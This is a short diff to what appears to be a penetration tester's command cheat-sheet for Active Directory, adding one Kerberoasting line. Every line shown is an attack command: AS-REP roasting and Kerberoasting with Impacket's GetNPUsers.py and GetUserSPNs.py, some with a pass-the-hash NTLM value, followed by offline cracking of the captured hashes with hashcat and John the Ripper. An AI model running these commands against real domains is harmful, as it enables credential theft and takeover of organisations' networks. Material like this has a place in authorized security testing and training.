@@ -118,6 +118,7 @@ GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfil
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 -dc-ip "$DC_IP" "$DOMAIN"/"$USER"
 hashcat --status --hash-type 18200 --attack-mode 0 ASREProastables.txt `fzf-wordlists`
 john --wordlist=`fzf-wordlists` ASREProastables.txt
+GetUserSPNs.py -outputfile Kerberoastables.txt -no-preauth "$USER" -usersfile "services.txt" -dc-host "$DC_IP" "$DOMAIN"/
 GetUserSPNs.py -outputfile Kerberoastables.txt -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
 GetUserSPNs.py -outputfile Kerberoastables.txt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 -dc-ip "$DC_IP" "$DOMAIN"/Administrator
 hashcat --status --hash-type 13100 --attack-mode 0 Kerberoastables.txt `fzf-wordlists`
